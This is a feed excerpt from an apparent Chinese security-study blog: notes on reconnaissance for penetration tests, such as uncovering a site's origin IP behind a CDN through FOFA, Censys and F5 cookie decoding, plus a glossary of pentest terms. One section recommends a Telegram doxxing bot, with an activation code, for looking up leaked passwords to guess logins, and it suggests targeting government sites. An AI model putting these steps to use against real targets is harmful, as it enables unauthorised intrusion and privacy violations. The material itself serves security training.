data-url="aHR0cDovL3Rvb2xzLmJ1Z3NjYW5lci5jb20vZG9tYWluMmlwLmh0bWw=">http://tools.bugscaner.com/domain2ip.html</span></li></ul></li></ul><h4 id="网络空间搜索引擎"><a class="markdownIt-Anchor" href="#网络空间搜索引擎">#</a> 网络空间搜索引擎</h4><p>最常见的网络空间搜索引擎有钟馗之眼、shodan、fofa；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">FOFA：https://fofa.so/</span><br><span class="line">title=&quot;网站的title关键字&quot;</span><br><span class="line">    body=&quot;网站的body特征&quot;</span><br><span class="line">    domain=&quot;t00ls.net&quot;</span><br><span class="line">    302一般都是cdn</span><br><span class="line"></span><br><span class="line">钟馗之眼：https://www.zoomeye.org/ </span><br><span class="line"></span><br><span class="line">Shodan：https://www.shodan.io/</span><br></pre></td></tr></table></figure><p>利用网站返回的内容寻找真实原始 IP，如果原始服务器 IP 也返回了网站的内容，那么可以在网上搜索大量的相关数据；</p><h4 id="ico图标通过空间搜索找真实ip"><a class="markdownIt-Anchor" href="#ico图标通过空间搜索找真实ip">#</a> ico 图标通过空间搜索找真实 ip</h4><p><span class="exturl" data-url="aHR0cHM6Ly93d3cudDAwbHMubmV0L2Zhdmljb24uaWNv">https://www.t00ls.net/favicon.ico</span> 下载图标 放到 fofa 识别</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628066824103-9b28b548-27d0-46f3-a1ce-fc9da5628e18.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628066832762-8feb2cc5-1852-4bf5-8ff2-5aa1c4fed666.png" alt="img"></p><h4 id="利用ssl证书寻找真实原始ip"><a class="markdownIt-Anchor" href="#利用ssl证书寻找真实原始ip">#</a> 利用 SSL 证书寻找真实原始 IP</h4><p>假如你在 xyz123boot.com 上托管了一个服务，原始服务器 IP 是 136.23.63.44。 而 CloudFlare 则会为你提供 DDoS 保护，Web 应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。为此，你的 Web 服务器就必须支持 SSL 并具有证书；</p><p>此时 CloudFlare 与你的服务器之间的通信，就像你和 CloudFlare 之间的通信一样，会被加密（即没有灵活的 SSL 存在）。这看起来很安全，但问题是，当你在端口 443（<span class="exturl" data-url="aHR0cHM6Ly8xMzYuMjMuNjMuNDQ6NDQz">https://136.23.63.44:443</span>）上直接连接到 IP 时，SSL 证书就会被暴露；</p><p>Censys 工具就能实现对整个互联网的扫描，Censys 是一款用以搜索联网设备信息的新型搜索引擎，安全专家可以使用它来评估他们实现方案的安全性，而黑客则可以使用它作为前期侦查攻击目标、收集目标信息的强大利器。Censys 搜索引擎能够扫描整个互联网，Censys 每天都会扫描 IPv4 地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告，若目标站点有 https 证书，并且默认虚拟主机配了 https 证书，我们就可以找所有目标站点是该 https 证书的站点；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9jZW5zeXMuaW8vaXB2NA==">https://censys.io/ipv4</span></p><p>攻击者唯一需要做的就是把上面用文字描述的搜索词翻译成实际的搜索查询参数；</p><p>baidu.com 查询的参数是：parsed.names:baidu.com</p><p>只显示有效证书的查询参数为：tags.raw:trusted</p><p>攻击者可以在 Censys 上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成；</p><p>组合后的参数：parsed.names:baidu.com and tags.raw:trusted</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627480155571-53011bf6-eed0-4576-aa67-7d9541d5cec7.png" alt="img"></p><p>Censys 将向你显示符合上述搜索条件的所有标准证书，以上这些证书是在扫描中找到的；</p><p>要逐个查看这些搜索结果，我们可以通过单击右侧的 “Explore”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; IPv4 Hosts；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627480540255-32c74593-f859-437a-b2a7-2f5059fcdf22.png" alt="img"></p><p>此时，我们将看到一个使用特定证书的 IPv4 主机列表，而真实原始 IP 就藏在其中；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627480768820-46c65e3b-d3d3-478d-b2ac-d77c5f8d4408.png" alt="img"></p><p>我们可以通过导航到端口 443 上的 IP 来验证，<span class="exturl" data-url="aHR0cDovL3huLS1iYWlkdS02bzZoZzZpMWVvMjlkdmdhcTcxaXpqNmJueTdkLmNvbQ==">看它是否重定向到 baidu.com</span> 或它是否直接在 IP 上显示网站；</p><h4 id="使用国外主机解析域名"><a class="markdownIt-Anchor" href="#使用国外主机解析域名">#</a> 使用国外主机解析域名</h4><p>国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实 IP</p><h4 id="网站漏洞查找"><a class="markdownIt-Anchor" href="#网站漏洞查找">#</a> 网站漏洞查找</h4><ul><li><p>目标敏感文件泄露，例如：phpinfo 之类的探针、GitHub 信息泄露等；</p></li><li><p>XSS 盲打，命令执行反弹 shell，SSRF 等；</p></li><li><p>无论是用社工还是其他手段，拿到了目标网站管理员在 CDN 的账号，从而在从 CDN 的配置中找到网站的真实 IP；</p></li></ul><h4 id="f5-ltm解码法"><a class="markdownIt-Anchor" href="#f5-ltm解码法">#</a> F5 LTM 解码法</h4><p>当服务器使用 F5 LTM 做负载均衡时，通过对 set-cookie 关键字的解码真实 ip 也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即 487098378 取出来，然后将其转为十六进制数 1d08880a，接着从后至前，以此取四位数出来，也就是 0a.88.08.1d，最后依次把他们转为十进制数 10.136.8.29，也就是最后的真实 ip；</p><h4 id="app抓包获取真实ip"><a class="markdownIt-Anchor" href="#app抓包获取真实ip">#</a> APP 抓包获取真实 IP</h4><p>模拟器下载 APP，访问，burp 抓包</p><h4 id="微信小程序抓包获取真实ip"><a class="markdownIt-Anchor" href="#微信小程序抓包获取真实ip">#</a> 微信小程序抓包获取真实 IP</h4><p>模拟器登录微信，访问小程序，burp 抓包；</p><h1 id="社工"><a class="markdownIt-Anchor" href="#社工">#</a> 社工</h1><p>在 tg 找社工机器人查找密码信息 或本地的社工库查找邮箱或者用户的密码或密文，组合密码在进行猜解登录；</p><p>推荐社工人肉查询机器人：@FreeSGKbot</p><p>输入激活码 SGKVHWWOSX 即可免费使用</p><p>加入链接 <span class="exturl" data-url="aHR0cHM6Ly90Lm1lL0ZyZWVTR0tib3Q/c3RhcnQ9U0dLVkhXV09TWA==">https://t.me/FreeSGKbot?start=SGKVHWWOSX</span></p><h1 id="非常规操作"><a class="markdownIt-Anchor" href="#非常规操作">#</a> 非常规操作</h1><p>1、如果找到了目标的一处资产，但是对目标其他资产的收集无处下手时，可以查看一下该站点的 body 里是否有目标的特征，然后利用网络空间搜索引擎（如 fofa 等）对该特征进行搜索，如：body=“XX 公司” 或 body=“baidu” 等；</p><p>该方式一般适用于特征明显，资产数量较多的目标，并且很多时候效果拔群；</p><p>2、当通过上述方式的找到 test.com 的特征后，再进行 body 的搜索，然后再搜索到 test.com 的时候，此时 fofa 上显示的 ip 大概率为 test.com 的真实 IP；</p><p>3、如果需要对政府网站作为目标，那么在批量获取网站首页的时候，可以用上：</p><ul><li><ul><li><span class="exturl" data-url="aHR0cDovLzExNC41NS4xODEuMjgvZGF0YWJhc2VJbmZvL2luZGV4">http://114.55.181.28/databaseInfo/index</span></li></ul></li></ul><p>之后可以结合上一步的方法进行进一步的信息收集；</p><h1 id="app信息收集"><a class="markdownIt-Anchor" href="#app信息收集">#</a> APP 信息收集</h1><h3 id="抓包精灵"><a class="markdownIt-Anchor" href="#抓包精灵">#</a> 抓包精灵</h3><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9tLmNyMTczLmNvbS9taXB4LzI3NzcwMS5odG1s">https://m.cr173.com/mipx/277701.html</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627560265604-7795cc0d-ca2b-41cb-b15e-5088bfc9be51.png" alt="img"></p><p>左上角选择应用进行抓包</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627560371347-aa36a37f-8e0f-4582-94de-f2c84508425f.png" alt="img"></p><p>打开软件，进行浏览，后台自动抓包</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627560531989-6a19fe57-3837-48ff-b0ba-35cf817cda6b.png" alt="img"></p><p>双击数据包，可以查看具体报文</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627560629450-efec0934-2650-4fdb-8fe4-4a5e43e94651.png" alt="img"></p><h3 id="微信小程序支付宝小程序"><a class="markdownIt-Anchor" href="#微信小程序支付宝小程序">#</a> 微信小程序支付宝小程序</h3><p>现在很多企业都有小程序，可以关注企业的微信公众号或者支付宝小程序，或关注运营相关人员，查看朋友圈，获取小程序；</p><p>微信直接搜索，支付宝直接搜索</p><p>公众号搜索网站：</p><p><span class="exturl" data-url="aHR0cHM6Ly93ZWl4aW4uc29nb3UuY29tL3dlaXhpbj90eXBlPTEmYW1wO2llPXV0ZjgmYW1wO3F1ZXJ5PSVFNiU4QiVCQyVFNSVBNCU5QSVFNSVBNCU5QQ==">https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E6%8B%BC%E5%A4%9A%E5%A4%9A</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628068277011-c175c1cf-3385-4b10-86f4-99ed0b2266d4.png" alt="img"></p><h3 id="app软件搜索"><a class="markdownIt-Anchor" href="#app软件搜索">#</a> APP 软件搜索</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cucWltYWkuY24v">https://www.qimai.cn/</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628068374261-3e0bda22-099e-4482-a52d-c1071dfe9d42.png" alt="img"></p><h1 id="资产管理"><a class="markdownIt-Anchor" href="#资产管理">#</a> 资产管理</h1><h2 id="goby"><a class="markdownIt-Anchor" href="#goby">#</a> goby</h2><p>通过先将目标网络 IT 资产进行规则分析建立知识库，在发生安全事件时能够在最短时间内完成安全应急的新技术。区别于传统的端口扫描与漏洞扫描，Goby 只针对受影响的小范围进行漏洞应急，所以这种方式速度最快，对目标网络影响最小；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9nb2JpZXMub3JnLw==">https://gobies.org/</span></p><p>食用指南：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvRy1WbjRodEFoandsSmI2N3YyVHRSdw==">https://mp.weixin.qq.com/s/G-Vn4htAhjwlJb67v2TtRw</span></p><h2 id=""><a class="markdownIt-Anchor" href="#">#</a> </h2><h2 id="arl"><a class="markdownIt-Anchor" href="#arl">#</a> ARL</h2><p>旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。<br>协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面’</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1RvcGhhbnRUZWNobm9sb2d5L0FSTA==">https://github.com/TophantTechnology/ARL</span></p><h2 id="-2"><a class="markdownIt-Anchor" href="#-2">#</a> </h2><h2 id="autoearn"><a class="markdownIt-Anchor" href="#autoearn">#</a> AUTOEARN</h2><p>一个利用 OneForAll（<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NobWlseWx0eS9PbmVGb3JBbGwlRUYlQkMlODklRTglQkYlOUIlRTglQTElOEMlRTUlQUQlOTAlRTUlOUYlOUYlRTYlOTQlQjYlRTklOUIlODYlRTMlODAlODFTaG9kYW4=">https://github.com/shmilylty/OneForAll）进行子域收集、Shodan</span> API 端口扫描、 进行 WAF 指纹识别、Xray（<span class="exturl" data-url="aHR0cHM6Ly94cmF5LmNvb2wveHJheS8lRUYlQkMlODklRTYlQkMlOEYlRTYlQjQlOUVGdXp6JUUzJTgwJTgxU2VydmVyJUU5JTg1JUIxJUU3JTlBJTg0JUU4JTg3JUFBJUU1JThBJUE4JUU1JThDJTk2JUU2JUJDJThGJUU2JUI0JTlFJUU2JTg5JUFCJUU2JThGJThGJUUzJTgwJTgxJUU3JTk0JUIxRmxhc2slRTYlOTQlQUYlRTYlOTIlOTElRTQlQjglODAlRTQlQjglQUElRTclQUUlODAlRTUlOEQlOTUlRTUlOEYlQUYlRTglQTclODYlRTUlOEMlOTYlRTclOTUlOEMlRTklOUQlQTIlRUYlQkMlOEMlRTUlOEQlQjMlRTYlOTclQjYlRTklODAlOUElRTclOUYlQTUlRTYlOEYlOTAlRTklODYlOTIlRTclOUElODQlRTYlQkMlOEYlRTYlQjQlOUUlRTYlOEMlOTYlRTYlOEUlOTglRTglQkUlODUlRTUlOEElQTklRTUlQjclQTUlRTUlODUlQjclRUYlQkMlOEMlRTYlOUMlQUMlRTglQjQlQTglRTQlQjglOEElRTYlOUIlQjQlRTUlODMlOEYlRTYlOTglQUYlRTQlQjglODAlRTQlQjglQUElRTYlQjUlODElRTclQTglOEIlRTYlQTElODYlRTYlOUUlQjYlRUYlQkMlOEMlRTUlQUUlOEMlRTYlODglOTAlRTUlOTAlODQlRTUlQjclQTUlRTUlODUlQjclRTQlQjklOEIlRTUlODklOEQlRTclOUElODQlRTglODclQUElRTUlOEElQTglRTUlOEMlOTYlRTglODElOTQlRTUlOEElQTglRTglQkYlODclRTclQTglOEIlRUYlQkMlOUI=">https://xray.cool/xray/）漏洞 Fuzz、Server 酱的自动化漏洞扫描、由 Flask 支撑一个简单可视化界面，即时通知提醒的漏洞挖掘辅助工具，本质上更像是一个流程框架，完成各工具之前的自动化联动过程；</span></p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0VjaG9jaXBoZXIvQVVUTy1FQVJO">https://github.com/Echocipher/AUTO-EARN</span></p><h2 id="tide-mars"><a class="markdownIt-Anchor" href="#tide-mars">#</a> Tide-Mars</h2><p>主要功能：客户管理、资产发现、子域名枚举、C 段扫描、资产变更监测、端口变更监测、域名解析变更监测、Awvs 扫描、POC 检测、web 指纹探测、端口指纹探测、CDN 探测、操作系统指纹探测、泛解析探测、WAF 探测、敏感信息检测等等。目前被动扫描准备对接 xray+wascan，准备二期开源该功能及其他若干功能；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1RpZGVTZWMvTWFycw==">https://github.com/TideSec/Mars</span></p><h2 id="bayonet"><a class="markdownIt-Anchor" href="#bayonet">#</a> bayonet</h2><p>bayonet 是一款 src 资产管理系统，从子域名、端口服务、漏洞、爬虫等一体化的资产管理系统；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NURi1NaXNzRmVuZy9iYXlvbmV0">https://github.com/CTF-MissFeng/bayonet</span></p><h2 id="bufferfly"><a class="markdownIt-Anchor" href="#bufferfly">#</a> bufferfly</h2><p>攻防演习 / 渗透测试资产处理小工具，对攻防演习 / 渗透测试前的信息搜集到的大批量资产 / 域名进行存活检测、获取标题头、语料提取、常见 Web 端口检测等；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RyMG9wL2J1ZmZlcmZseQ==">https://github.com/dr0op/bufferfly</span></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第二天资产信息收集&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第二天资产信息收集&quot;&gt;#&lt;/a&gt; 第二天：资产信息收集&lt;/h1&gt;
&lt;h2 id=&quot;img&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#img</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AE%80%E4%BB%8B/"/>
    <id>https://sun-spots.github.io/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AE%80%E4%BB%8B/</id>
    <published>2022-03-04T01:22:19.202Z</published>
    <updated>2022-03-04T01:25:24.063Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一天渗透测试简介"><a class="markdownIt-Anchor" href="#第一天渗透测试简介">#</a> 第一天：渗透测试简介</h1><h2 id="一术语介绍"><a class="markdownIt-Anchor" href="#一术语介绍">#</a> 一：术语介绍</h2><h3 id="常见术语"><a class="markdownIt-Anchor" href="#常见术语">#</a> 常见术语：</h3><ul><li><p>病毒：是在计算机程序中插入的破坏计算机功能或者数据的代码，能影响计算机使用，能<strong>自我复制</strong>的一组计算机指令或者程序代码；</p></li><li><p>木马：是比较流行的病毒文件，与一般的病毒不同，它不会自我繁殖，也并不 “刻意” 地去感染其他文件，它通过将自身伪装吸引用户下载执行，向施种木马者提供打开被种主机的门户，使施种者可以任意毁坏、窃取被种者的文件，甚至远程操控被种主机；</p></li><li><p>肉鸡：指电脑中了木马，或者留了后门，可以被远程操控的机器，现在许多人把有 WEBSHELL 权限的机器也叫肉鸡；</p></li><li><p>抓鸡：利用使用大量的程序的漏洞，使用自动化方式获取肉鸡的行为；</p></li><li><p>挖矿：是将一段时间内比特币系统中发生的交易进行确认，并记录在区块链上形成新区块的过程；</p></li><li><p>HTTP/HTTPS：定义 Web 客户端如何从 Web 服务器请求 Web 页面，以及服务器如何把 Web 页面传送给客户端；</p></li><li><p>MD5：一种被广泛使用的密码散列函数，属于不可逆加密；</p></li><li><p>CMS：Content Management System 的缩写，内容管理系统；</p></li><li><p>框架：代码框架 比如 CMS 是已经装修好的房子 框架就是毛坯房；</p></li><li><p>漏洞：硬件、软件、协议等可利用安全缺陷，可能被攻击者利用，对数据进行篡改，控制等；</p></li><li><p>一句话木马：通过向服务端提交一句简短的代码，配合本地客户端实现 Webshell 功能的木马；</p></li><li><p>Webshell: 通过 Web 入侵后留下的后门工具，可以据此对网站服务进行一定程度的控制；</p></li><li><p>提权：操作系统低权限的账户将自己提升为管理员权限使用的过程；</p></li><li><p>跳板：使用肉鸡 IP 来实施攻击其他目标，以便更好的隐藏自己的身份信息；</p></li><li><p>旁站：即同服务器下的网站入侵，入侵之后可以通过提权跨目录等手段拿到目标网站的权限；</p></li><li><p>C 段：即同 C 段下服务器入侵。如目标 IP 为 192.168.1.1 入侵 192.168.1.* 的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息；</p></li><li><p>撞库：是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，批量登陆其他网站后，得到可以登录的用户。</p></li><li><p>暴库：通过一些技术手段或者程序漏洞得到数据库的地址，并将数据非法下载到本地。</p></li><li><p>Poc：能证明漏洞存在的代码；</p></li><li><p>Exp：漏洞利用 一般都是 demo 工具 ；</p></li><li><p>Bug：指系统功能与预期不一致的代码缺陷；</p></li><li><p>Waf：WEB 应用防护系统，也称之为网站应用级入侵防御系统；</p></li><li><p>Payload：攻击载荷，被送到目标机器执行的<strong>整段代码</strong>；</p></li><li><p>0day：未公开的漏洞 仅少数人知道；</p></li><li><p>1day：刚公开的漏洞官方发布了补丁，但是网上还有很多未打补丁的漏洞；</p></li><li><p>Nday：漏洞发布了很久还是没有修复的漏洞；</p></li><li><p>Shellcode：是一段用于利用软件漏洞而执行的代码，shellcode 为 16 进制的机器码，因为经常让攻击者获得 shell 而得名。</p></li><li><p>APT：高级可持续性攻击，是指组织（特别是政府）或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的供给形式（极强的隐蔽性、潜伏期长，持续性强、目标性强）</p></li><li><p>更多行业术语：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvOTdEQTBqcWVxY2o1U3BlNk9UWERlZw==">https://mp.weixin.qq.com/s/97DA0jqeqcj5Spe6OTXDeg</span></p></li></ul><h3 id="其他相关知识"><a class="markdownIt-Anchor" href="#其他相关知识">#</a> 其他相关知识：</h3><h4 id="系统相关"><a class="markdownIt-Anchor" href="#系统相关">#</a> 系统相关</h4><ul><li><p>WMI (Windows Management Instrumentation)</p></li><li><ul><li>Windows 管理规范，用户可以使用 WMI 管理本地和远程计算机</li></ul></li></ul><h4 id="网络协议"><a class="markdownIt-Anchor" href="#网络协议">#</a> 网络协议</h4><ul><li><p>轻型目录访问协议 (Lightweight Directory Access Protocol, LDAP)</p></li><li><ul><li>通过<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9JUCVFNSU4RCU4RiVFOCVBRSVBRQ=="> IP 协议</span>提供访问控制和维护分布式信息的目录信息</li></ul></li><li><p>标识名 (Distinguished Name, DN)</p></li><li><p>相对标识名 (Relative Distinguished Name, RDN)</p></li><li><p>服务器消息块 (Server Message Block, SMB)</p></li><li><ul><li>用于 Web 连接和客户端与服务器之间的信息沟通，局域网文件共享传输协议</li></ul></li><li><p>网络文件共享系统 (Common Internet File System, CIFS)</p></li><li><ul><li>用于网络设备间文件共享，是 SMB 协议的升级版</li></ul></li><li><p>SMTP (Simple Mail Transfer Protocol)</p></li><li><p>简单网络管理协议 (Simple Network Management Protocol, SNMP)</p></li><li><p>POP3 (Post Office Protocol 3)</p></li><li><p>IMAP (Internet Mail Access Protocol)</p></li><li><ul><li>交互邮件访问协议</li></ul></li><li><p>HTTP (HyperText Transfer Protocol)</p></li><li><p>HTTPS (HyperText Transfer Protocol over Secure Socket Layer)</p></li><li><p>动态主机配置协议 (Dynamic Host Configuration Protocol, DHCP)</p></li><li><p>远程过程调用 (Remote Procedure Call, RPC)</p></li><li><ul><li>一个节点请求另一个节点提供的服务</li></ul></li><li><p>Java 调试线协议 (Java Debug Wire Protocol, JDWP)</p></li><li><ul><li>方便灵活的搭建 Java 调试应用程序</li></ul></li><li><p>网络文件系统 (Network File System, NFS)</p></li><li><ul><li>使使用者访问网络上别处的文件就像在使用自己的计算机一样</li></ul></li><li><p>服务主体名称 (Service Principal Name, SPN)</p></li><li><p>简单身份验证 (Simple Authentication and Security Layer, SASL)</p></li><li><p>链路本地多播名称解析 (Link-Local Multicast Name Resolution, LLMNR)</p></li><li><ul><li>通过此协议对同一本地链路上的主机执行名称解析</li></ul></li></ul><h4 id="网络应用"><a class="markdownIt-Anchor" href="#网络应用">#</a> 网络应用</h4><ul><li><p>证书透明度 (Certificate Transparency, CT)</p></li><li><p>DNS 证书颁发机构授权 (DNS Certification Authority Authorization, CAA)</p></li><li><p>应用级网关 (Application Level Gateway, ALG)</p></li></ul><h4 id="安全相关"><a class="markdownIt-Anchor" href="#安全相关">#</a> 安全相关</h4><ul><li><p><strong>缺点 (defect /mistake)</strong></p></li><li><ul><li>软件在实现上和设计上的弱点</li><li>缺点是缺陷和瑕疵的统称</li></ul></li><li><p><strong>缺陷 (bug)</strong></p></li><li><ul><li>实现层面的软件缺点</li><li>容易被发现和修复</li></ul></li><li><ul><li>例如：缓冲区溢出</li></ul></li><li><p><strong>瑕疵 (flaw)</strong></p></li><li><ul><li>一种设计上的缺点，难以察觉</li><li>瑕疵往往需要人工分析才能发现</li></ul></li><li><ul><li>软件系统中错误处理或恢复模块，导致程序不安全或失效</li></ul></li><li><p><strong>漏洞 (vulnerability)</strong></p></li><li><ul><li>可以用于违反安全策略的缺陷或瑕疵</li></ul></li><li><p><strong>IAST (Interactive Application Security Testing)</strong></p></li><li><ul><li>交互式应用程序安全测试，也就是我们所熟知的灰盒安全测试</li></ul></li><li><p><strong>DAST (Dynamic Application Security Testing)</strong></p></li><li><ul><li>动态应用程序安全测试，也就是我们所熟悉的黑盒测试</li></ul></li><li><p><strong>SAST (Static Application Security Testing)</strong></p></li><li><ul><li>静态应用程序安全测试，也就是我们熟知的白盒测试</li></ul></li><li><p><strong>ATT&amp;CK™ (Adversarial Tactics, Techniques, and Common Knowledge, ATT&amp;CK)</strong></p></li><li><ul><li>站在攻击者的视角来描述攻击中各阶段用到的技术的模型。ATT&amp;CK 对于任何组织来说都是非常有用的，因为组织需建立一个基于威胁的防御体系。</li></ul></li><li><p><strong>横向移动 (Lateral Movement)</strong></p></li><li><ul><li>指获取内网某台机器的控制权之后，以被攻陷主机为跳板，通过搜集域内凭证，找办法访问到域内其他机器，再依次循环往复，直到获得域控权限甚至控制内网</li></ul></li></ul><h4 id="漏洞类型"><a class="markdownIt-Anchor" href="#漏洞类型">#</a> 漏洞类型</h4><ul><li><p>跨站脚本攻击 (Cross Site Scripting, XSS)</p></li><li><p>跨站请求伪造 (Cross-Site Request Forgery, CSRF)</p></li><li><p>中间人攻击 (Man-in-the-middle, MITM)</p></li><li><p>服务端请求伪造 (Server Side Request Forgery, SSRF)</p></li><li><p>高级持续威胁 (Advanced Persistent Threat, APT)</p></li><li><p>远程命令执行 (Remote Command Execute, RCE)</p></li><li><p>远程代码执行 (Remote Code Execute, RCE)</p></li><li><p>带外数据 (Out-Of-Band, OOB)</p></li></ul><h4 id="攻击方式"><a class="markdownIt-Anchor" href="#攻击方式">#</a> 攻击方式</h4><ul><li><p>鱼叉攻击 (Spear Phishing)</p></li><li><p>水坑攻击 (Water Holing)</p></li><li><p>分布式拒绝服务 (Distributed Denial of Service, DDoS)</p></li></ul><h4 id="防御技术"><a class="markdownIt-Anchor" href="#防御技术">#</a> 防御技术</h4><ul><li><p>网络检测响应 (Network-based Detection and Response, NDR)</p></li><li><p>终端检测响应 (Endpoint Detection and Response, EDR)</p></li><li><p>托管检测响应 (Managed Detection and Response, MDR)</p></li><li><p>扩展检测响应 (Extended Detection and Response, XDR)</p></li><li><p>自适应安全架构 (Adaptive Security Architecture, ASA)</p></li><li><p>零信任网络访问 (Zero Trust Network Access, ZTNA)</p></li><li><p>云安全配置管理 (Cloud Security Posture Management, CSPM)</p></li></ul><h4 id="防护设施"><a class="markdownIt-Anchor" href="#防护设施">#</a> 防护设施</h4><ul><li><p>入侵检测系统 (Intrusion Detection System, IDS)</p></li><li><p>主机型入侵检测系统 (Host-based Intrusion Detection System, HIDS)</p></li><li><p>入侵防御系统 (Intrusion Prevent System, IPS)</p></li><li><p>主机入侵防御系统 (Host Intrusion Prevent System, HIPS)</p></li><li><p>实时应用程序自我保护 (Runtime Application Self-protection，RASP)</p></li><li><p>统一端点管理 (Unified Endpoint Management, UEM)</p></li><li><ul><li>通过单个控制台在任何设备上管理、保护和部署企业资源和应用程序</li></ul></li></ul><h4 id="认证"><a class="markdownIt-Anchor" href="#认证">#</a> 认证</h4><ul><li><p>双因素认证 (Two-Factor Authentication, 2FA)</p></li><li><p>多因素认证 (Multi-Factor Authentication, MFA)</p></li><li><p>一次性密码 (One-Time Password, OTP)</p></li></ul><h2 id="二渗透测试流程"><a class="markdownIt-Anchor" href="#二渗透测试流程">#</a> 二：渗透测试流程</h2><h3 id="什么是渗透测试"><a class="markdownIt-Anchor" href="#什么是渗透测试">#</a> 什么是渗透测试？</h3><ul><li>渗透测试就是通过模拟真实黑客的攻击手段来对目标系统进行一些列的评估！</li><li>详细点：渗透测试是指渗透人员在不同的位置 (比如从内网，从外网等位置) 利用各种手段对某个特定网络进行测试，以其发现和挖掘系统中存在的漏洞，然后输出渗透测试报告，并交给网络所有者；</li></ul><h3 id="渗透测试的必要性"><a class="markdownIt-Anchor" href="#渗透测试的必要性">#</a> 渗透测试的必要性</h3><p>目的：侵入系统并获取机密信息并将入侵的过程和细节产生报告提供给用户，由此确定用户系统所存在的安全威胁，并能及时提醒安全管理员完善安全策略，降低安全风险。</p><p>为什么要进行渗透测试？</p><ul><li><ul><li><ul><li>百密一疏，新系统可能存在未知的风险</li><li>未雨绸缪，而不是亡羊补牢</li></ul></li></ul></li><li><ul><li><ul><li>专业的渗透测试后，即使是系统未被攻破，也可以以此证明先前实行的防御是有效的</li><li>专业的渗透测试可以有效的评估系统的安全状况，并提出合理的改进方案</li></ul></li></ul></li></ul><h3 id="渗透测试的原则"><a class="markdownIt-Anchor" href="#渗透测试的原则">#</a> 渗透测试的原则</h3><ul><li><p>渗透测试是一个渐进的并且逐步深入的过程；</p></li><li><p>渗透测试是选择不影响业务系统正常运行的攻击方法进行的测试；</p></li><li><p>合规性：符合规范和法律要求也是执行业务的一个必要条件；</p></li></ul><h3 id="什么是等保测评"><a class="markdownIt-Anchor" href="#什么是等保测评">#</a> 什么是等保测评？</h3><p>全称是信息安全等级保护测评，是经公安部认证的具有资质的测评机构，依据国家信息安全等级保护规范规定，受有关单位委托，按照有关管理规范和技术标准，对信息系统安全等级保护状况进行检测评估的活动。</p><ul><li>安全技术测评：包括物理安全、网络安全、主机系统安全、应用安全和数据安全等五个层面上的安全控制测评。</li><li>安全管理测评：包括安全管理机构、安全管理制度、人员安全管理、系统建设管理和系统运维管理等五个方面的安全控制评。</li></ul><h3 id="什么是风险评估"><a class="markdownIt-Anchor" href="#什么是风险评估">#</a> 什么是风险评估？</h3><p>风险评估是对信息资产（即某事件或事物所具有的信息集）所面临的威胁、存在的弱点、造成的影响，以及三者综合作用所带来风险的可能性的评估。</p><p><em><strong>三者区别</strong></em></p><table><thead><tr><th>名词</th><th>执行目的</th><th>参照标准</th></tr></thead><tbody><tr><td>渗透测试</td><td>评估网络 / 